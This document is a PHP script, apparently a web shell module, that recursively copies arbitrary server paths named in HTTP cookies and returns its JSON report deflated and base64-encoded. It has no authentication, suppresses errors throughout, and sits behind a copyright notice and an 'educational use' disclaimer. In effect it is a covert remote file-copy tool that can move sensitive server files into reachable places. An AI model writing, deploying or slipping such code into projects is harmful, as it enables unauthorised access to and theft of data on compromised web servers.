<?php
/*
*     Copyright (c) 2023 SIPHON2
*     All rights reserved.
*    
*     This PHP script, including any associated documentation or files,
*     is the intellectual property of SIPHON2 and is protected by
*     international copyright laws and treaties. Unauthorized copying,
*     distribution, or reproduction of this script, or any portion
*     thereof, is strictly prohibited and may result in severe civil
*     and criminal penalties, as well as liability for monetary damages.
*    
*     You may not use, modify, adapt, merge, sublicense, rent, lease,
*     loan, sell, or otherwise exploit this script without prior
*     written permission from SIPHON2.
*    
*     You are granted a non-exclusive, non-transferable, limited license
*     to use this script solely for non-commercial purposes or for
*     evaluation purposes with the intent to purchase a commercial
*     license. Any use of this script for commercial purposes without
*     a valid commercial license is expressly prohibited.
*    
*     This script is provided "as is" without any warranties of any kind,
*     whether express or implied. SIPHON2 shall not be liable for any
*     damages, including but not limited to, direct, indirect, special,
*     incidental, or consequential damages or loss of data, even if
*     advised of the possibility of such damages.
*    
*     For inquiries regarding licensing or to obtain written permission
*     to use this script for any purpose not expressly permitted in this
*     notice, please contact SIPHON2 at siphon4545@gmail.com.
*
*
*
*
*
*
*     ---------------------------------------------------------------------------

*     #######################################
*     ##  READ CAREFULLY BEFORE PROCEED!!! ##
*     #######################################

*     This PHP script is intended solely for educational purposes.
*     It is meant to be used as a learning resource and for understanding
*     specific concepts.
*    
*     WARNING: Use this script responsibly and at your own risk. The author
*     (SIPHON2) of this script shall not be liable for any direct, indirect,
*     special, incidental, or consequential damages arising from the use or
*     misuse of this script. The users of this script are solely responsible
*     for any consequences that may occur while using this script. Think twice
*     about the potential consequences and ensure that you have proper
*     authorization before using any part of this script in any environment.
*    
*     By using this script, you agree to accept all risks and responsibilities
*     associated with its usage. If you do not agree with these terms, do not
*     proceed to use this script.
*    
*     Please be reminded that you, and only you, are solely responsible for your
*     actions. Always adhere to responsible and ethical coding practices, and
*     ensure to obtain proper authorization before running any script in a live
*     or production environment.

*     YOUR ACTIONS CARRY CONSEQUENCES, SO THINK TWICE BEFORE PROCEEDING.
*     
*     ---------------------------------------------------------------------------
*     
*     COPY SOURCE PATH TO THE DESTINATION PATH
*     
*/




$start = microtime(true);
$rsc_files = 0;
$rsc_dirs = 0;
$rsc_links = 0;
$dst_files = 0;
$dst_dirs = 0;
$dst_links = 0;
$debug = [];
$status = false;

$arguments = (object) [
    'level' => isset($_COOKIE["level"]) ? (int)$_COOKIE["level"] : 9,
    'source' => isset($_COOKIE["source"]) ? $_COOKIE["source"] : null,
    'destination' => isset($_COOKIE["destination"]) ? $_COOKIE["destination"] : null
];

$function_name = null;

function calculateFileHash($filePath)
{
    return hash_file('md5', $filePath);
}

function calculateDirectoryHash($dirPath)
{
    $fileHashes = array();
    $directory = new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($directory, RecursiveIteratorIterator::SELF_FIRST);
    foreach ($iterator as $file)
    {
        if ($file->isFile())
        {
            $filePath = $file->getPathname();
            $fileHash = hash_file('md5', $filePath);
            $fileHashes[] = $fileHash;
        }
    }
    sort($fileHashes);
    return hash('md5', implode('', $fileHashes));
}


function calculateSymlinkHash($symlinkPath)
{
    $linkAttributes = array(
        readlink($symlinkPath),
        fileperms($symlinkPath),
        fileowner($symlinkPath),
        filegroup($symlinkPath),
    );
    return md5(serialize($linkAttributes));
}


function calculateHash($path)
{
    if ($path)
    {
        if (is_file($path))
        {
            return calculateFileHash($path);
        }
        elseif (is_dir($path))
        {
            return calculateDirectoryHash($path);
        }
        elseif (is_link($path))
        {
            return calculateSymlinkHash($path);
        }
    }
    else
    {
        return null;
    }

}

function REPLICATE($source, $destination)
{
    global $start, $rsc_files, $rsc_dirs, $rsc_links, $dst_files, $dst_dirs, $dst_links, $debug, $status, $function_name;
    $function_name = __FUNCTION__;
    $permissions = 0444;
    $perm_err = false;

    if ($source != null && $destination != null)
    {
        if (@is_link($source))
        {
            $rsc_links += 1;
            if (@symlink(@readlink($source), $destination))
            {
                $dst_links += 1;
            }
        }
        elseif (@is_dir($source))
        {
            $rsc_dirs += 1;
            $sourcePermissions = @substr(@sprintf('%04o', @fileperms($source)), -4);
            $permissions = @substr($sourcePermissions, -3);
    
            @mkdir($destination, @octdec($permissions), true);
            if ($perm_err === true)
            {
                @array_push($debug, ['warning' => 'Default(' . $permissions . ') permissions were set for `' . $source . '`']);
            }
    
            $directory = @opendir($source);
            while (($file = @readdir($directory)) !== false)
            {
                if ($file != '.' && $file != '..')
                {
                    @REPLICATE($source . '/' . $file, $destination . '/' . $file);
                }
            }
            @closedir($directory);
            $dst_dirs += 1;
        }
        else
        {
            $rsc_files += 1;
            if (@copy($source, $destination))
            {
                $dst_files += 1;
            }
            else
            {
                @array_push($debug, ['error' => 'Unable to copy file `' . $source . '`']);
            }
        }
    }
    else
    {
        @array_push($debug, ['error' => (($source) ? 'Destination' : 'Source') . ' must not be empty']);
    }
}




@REPLICATE($arguments->source, $arguments->destination);

$response = json_encode([
    'status' => empty($debug),
    'time' => microtime(true) - $start,
    'debug' => $debug,
    'operation' => [
        'action' => $function_name,
        'arguments' => $arguments
    ],
    'data' => [
        'source' => [
            'path' => $arguments->source,
            'hash' => calculateHash($arguments->source)
        ],
        'destination' => [
            'path' => $arguments->destination,
            'hash' => calculateHash($arguments->destination)
        ],
        'files' => [
            'total' => $rsc_files,
            'cloned' => $dst_files
        ],
        'dirs' => [
            'total' => $rsc_dirs,
            'cloned' => $dst_dirs
        ],
        'symlinks' => [
            'total' => $rsc_links,
            'cloned' => $dst_links
        ]
    ]
    ], JSON_UNESCAPED_UNICODE);

echo trim(base64_encode(gzdeflate($response, $arguments->level)), '=');
// echo $response;


?>
